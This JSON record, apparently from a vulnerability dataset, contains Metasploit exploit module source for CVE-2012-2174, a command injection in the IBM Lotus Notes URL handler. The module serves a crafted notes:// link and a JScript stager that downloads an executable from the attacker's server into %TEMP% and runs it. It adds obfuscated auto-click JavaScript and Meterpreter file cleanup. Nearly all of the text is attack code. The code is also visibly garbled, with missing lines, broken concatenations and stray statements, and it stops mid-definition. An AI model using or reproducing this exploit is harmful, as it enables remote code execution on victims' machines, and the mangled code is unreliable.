{
    "text": "vul_name : IBM Lotus Notes Client URL Handler Command Injection ， vul_cve : CVE-2012-2174 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # Framework web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpServer : HTML ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => \"IBM Lotus Notes Client URL Handler Command Injection\" ,  ， 'Description' => %q{ ， This modules exploits a command injection vulnerability in the URL handler for ， an specially crafted notes : / URL to execute arbitrary commands with also arbitrary ， arguments. This module has been tested successfully on Windows XP SP3 with IE8 ,  ， Google Chrome 23.0.1271.97 m and IBM Lotus Notes Client 8.5.2. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Moritz Jodeit' ,  # Vulnerability discovery ， 'Sean de Regge' ,  # Vulnerability analysis ， 'juan vazquez' # Metasploit ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2012-2174' ]  ,  ，  [ 'OSVDB' , '83063' ]  ,  ，  [ 'BID' , '54070' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Payload' => ， { ， 'Space' => 2048 ,  ， 'StackAdjustment' => -3500 ， } ,  ， 'DefaultOptions' => ， { ， 'EXITFUNC' => \"none\" ,  ， 'InitialAutoRunScript' => 'migrate -k -f' ， } ,  ， 'Platform' => 'win' ,  ， 'Targets' => ，  [  ，  [ 'Automatic' , {} ]  ，  ]  ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => \"Jun 18 2012\" ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， OptBool.new ( 'OBFUSCATE' ,  [ false , 'Enable JavaScript obfuscation' , false ]  )  ，  ]  , self.class )  ， end ， def exploit ，  @ exe_name = rand_text_alpha ( 2 ) + \".exe\" ，  @ stage_name = rand_text_alpha ( 2 ) + \".js\" ， super ， end ， session.core.use ( \"stdapi\" ) unless session.ext.aliases.include? ( \"stdapi\" )  ， end ，  @ dropped_files.delete_if do | file |  ， win_file = file.gsub ( \"/\" , \"\\\" )  ， begin ， wintemp = session.fs.file.expand_path ( \"%TEMP%\" )  ， win_file = \" # {wintemp}\\ # {win_file}\" ，  # Meterpreter should do this automatically as part of ，  # fs.file.rm (  ) . Until that has been implemented , remove the ，  # read-only flag with a command. ， session.shell_command_token ( %Q | attrib.exe -r \" # {win_file}\" |  )  ， session.fs.file.rm ( win_file )  ， print_good ( \"Deleted # {file}\" )  ， true ， rescue : Rex : Post : Meterpreter : RequestError ， print_error ( \"Failed to delete # {win_file}\" )  ， false ， end ， end ， end ， end ， register_file_for_cleanup ( \" # { @ stage_name}\" ) unless @ dropped_files and @ dropped_files.include? ( \" # { @ stage_name}\" )  ， register_file_for_cleanup ( \" # { @ exe_name}\" ) unless @ dropped_files and @ dropped_files.include? ( \" # { @ exe_name}\" )  ， data = generate_payload_exe ( { : code=>p.encoded} )  ， print_status ( \"Sending payload\" )  ， send_response ( cli , data , {'Content-Type'=>'application/octet-stream'} )  ， end ， my_host = ( datastore [ 'SRVHOST' ] = '0.0.0.0' ) ? Rex : Socket.source_address ( cli.peerhost )  : datastore [ 'SRVHOST' ]  ， schema = \"https\" ， schema = \"http\" ， end ， uri = \" # {schema} : / # {my_host}\" ， uri \" :  # {datastore [ 'SRVPORT' ] } # {get_resource (  ) }/ # {rand_text_alpha ( rand ( 6 ) +3 ) }.exe\" ， script = \"var w=new ActiveXObject ( 'wscript.shell' )  ; \" ， script \"w.CurrentDirectory=w.ExpandEnvironmentStrings ( '\\%TEMP\\%' )  ; \" ， script \"var x=new ActiveXObject ( 'Microsoft.XMLHTTP' )  ; \" ， script \"x.open ( 'GET' , ' # {uri}' , false )  ; \" ， script \"x.send (  )  ; \" ， script \"var s=new ActiveXObject ( 'ADODB.Stream' )  ; \" ， script \"s.Mode=3 ; \" ， script \"s.Type=1 ; \" ， script \"s.Open (  )  ; \" ， script \"s.Write ( x.responseBody )  ; \" ， script \"s.SaveToFile ( ' # { @ exe_name}' , 2 )  ; \" ， script \"w.Run ( ' # { @ exe_name}' )  ; \" ， vmargs = \"/q /s /c echo # {script} > %TEMP%\\ # { @ stage_name}& start cscript %TEMP%\\ # { @ stage_name}& REM\" ， link_id = rand_text_alpha ( 5 + rand ( 5 )  ， js_click_link = %Q |  ， var cancelled = false ;  ， var event = document.createEvent ( \"MouseEvents\" )  ;  ， event.initMouseEvent ( \"click\" , true , true , window ,  ， 0 , 0 , 0 , 0 , 0 ,  ， false , false , false , false ,  ， 0 , null )  ;  ， cancelled = ! link.dispatchEvent ( event )  ;  ， } ， cancelled = ! link.fireEvent ( \"onclick\" )  ;  ， } ， window.location = link.href ;  ， } ， } ， js_click_link = : Rex : Exploitation : JSObfu.new ( js_click_link )  ， js_click_link.obfuscate ， js_click_link_fn = js_click_link.sym ( 'clickLink' )  ， js_click_link_fn = 'clickLink' ， end ， html = -EOS",
    "time": "2012.12.25"
}